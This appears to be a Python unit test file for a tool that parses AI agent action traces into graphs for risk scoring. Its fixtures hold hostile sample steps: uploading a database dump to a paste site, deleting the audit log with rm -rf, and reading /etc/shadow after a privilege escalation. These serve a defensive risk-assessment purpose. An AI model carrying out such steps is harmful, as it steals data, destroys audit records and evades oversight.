"""
Unit tests for TrajectoryDAG in agent_risk.dag_parser.
"""

import sys
from pathlib import Path

# Add src to sys.path
SRC_DIR = Path(__file__).resolve().parent.parent / "src"
if str(SRC_DIR) not in sys.path:
    sys.path.insert(0, str(SRC_DIR))

from agent_risk.dag_parser import TrajectoryDAG


def test_basic_linear_trajectory():
    interaction = {
        "id": "trace-test-01",
        "goal": "Read customer report and summarize findings",
        "trajectory": [
            {
                "step_id": 1,
                "thought": "Find report in documents directory",
                "action": {"tool": "file_reader", "inputs": {"path": "report.txt"}},
                "observation": "Customer satisfaction score is 89%.",
                "is_error": False,
            }
        ],
        "proposed_action": {
            "tool": "email_client",
            "inputs": {"recipient": "manager@corp.com", "body": "Summary of report"},
        },
        "risk_level": 1,  # ordinal scale 1-5 (or 0-4 mapped to 1-5)
    }

    dag = TrajectoryDAG(interaction)
    adj = dag.get_adjacency_matrix()
    seq = dag.get_topological_sequence()
    order = dag.get_topological_order()

    assert isinstance(adj, list)
    assert len(adj) == len(order)
    assert "<|user_intent|>" in seq
    assert "<|api_call|>" in seq
    assert "<|observation|>" in seq
    assert "<|proposed_action|>" in seq
    assert dag.risk_level >= 1.0 and dag.risk_level <= 5.0
    print("[PASS] test_basic_linear_trajectory passed!")


def test_pruning_unconnected_error_branch():
    interaction = {
        "id": "trace-test-02",
        "goal": "Exfiltrate database dump",
        "trajectory": [
            {
                "step_id": 1,
                "thought": "Explore server",
                "action": {"tool": "bash", "inputs": {"cmd": "ls /var/db"}},
                "observation": "db.sqlite",
                "is_error": False,
            },
            {
                "step_id": 2,
                "thought": "Try invalid port",
                "action": {"tool": "curl", "inputs": {"url": "http://10.0.0.99:9999"}},
                "observation": "Error: Connection refused",
                "is_error": True,
                "dependencies": [1],
            },
            {
                "step_id": 3,
                "thought": "Use valid exfiltration endpoint",
                "action": {"tool": "curl", "inputs": {"url": "https://pastebin.org/dump"}},
                "observation": "HTTP 200 OK - saved to paste 123",
                "is_error": False,
                "dependencies": [1],
            },
        ],
        "proposed_action": {
            "tool": "bash",
            "inputs": {"cmd": "rm -rf /var/log/audit.log"},
        },
        "risk_level": 4,  # High / Critical
    }

    dag = TrajectoryDAG(interaction)
    order = dag.get_topological_order()

    # Step 2 errored and does not connect to the final action; it should be pruned!
    assert "obs_step_2" not in order
    assert "action_step_2" not in order
    assert "obs_step_3" in order
    assert dag.pruned_node_count >= 2
    print(f"[PASS] test_pruning_unconnected_error_branch passed! Pruned nodes: {dag.pruned_node_count}")


def test_preserving_connected_error_branch():
    interaction = {
        "id": "trace-test-03",
        "goal": "Access restricted file",
        "trajectory": [
            {
                "step_id": 1,
                "thought": "Attempt standard read",
                "action": {"tool": "cat", "inputs": {"file": "/etc/shadow"}},
                "observation": "Error: Permission denied (errno 13)",
                "is_error": True,
            },
            {
                "step_id": 2,
                "thought": "Permission was denied, so escalate privileges",
                "action": {"tool": "sudo_exploit", "inputs": {"target": "cve-2026"}},
                "observation": "Escalated to root.",
                "is_error": False,
                "dependencies": [1],
            },
        ],
        "proposed_action": {
            "tool": "cat",
            "inputs": {"file": "/etc/shadow"},
        },
        "risk_level": 5,
    }

    dag = TrajectoryDAG(interaction)
    order = dag.get_topological_order()

    # Step 1 errored, but Step 2 directly depends on Step 1, which leads to proposed_action.
    # Therefore, Step 1 connects to the final action and MUST be preserved!
    assert "obs_step_1" in order
    assert "action_step_1" in order
    assert "obs_step_2" in order
    print("[PASS] test_preserving_connected_error_branch passed! Error node preserved as expected.")


if __name__ == "__main__":
    test_basic_linear_trajectory()
    test_pruning_unconnected_error_branch()
    test_preserving_connected_error_branch()
    print("\nAll TrajectoryDAG tests completed successfully!")

